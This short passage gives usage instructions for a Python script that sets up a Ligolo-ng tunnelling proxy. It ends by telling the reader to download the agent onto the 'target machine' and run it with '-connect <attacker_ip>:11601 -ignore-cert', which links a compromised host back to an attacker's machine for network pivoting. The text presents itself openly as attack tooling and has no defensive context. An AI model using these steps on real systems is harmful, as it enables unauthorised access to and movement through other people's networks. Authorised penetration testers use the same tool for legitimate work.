Usage Instructions:

Save the Script: Save the script to a file, for example, ligolo_setup.py.

Make the Script Executable: Run chmod +x ligolo_setup.py to make the script executable.

Execute the Script: Run the script with the required arguments:

./ligolo_setup.py --proxy-path /path/to/proxy --listen-address 0.0.0.0:11601 --interface-name ligolo

Deploy the Agent: On the target machine, download the appropriate Ligolo-ng agent binary and run it using the command provided by the script:

./agent -connect <attacker_ip>:11601 -ignore-cert Replace <attacker_ip> with the IP address of your attack machine
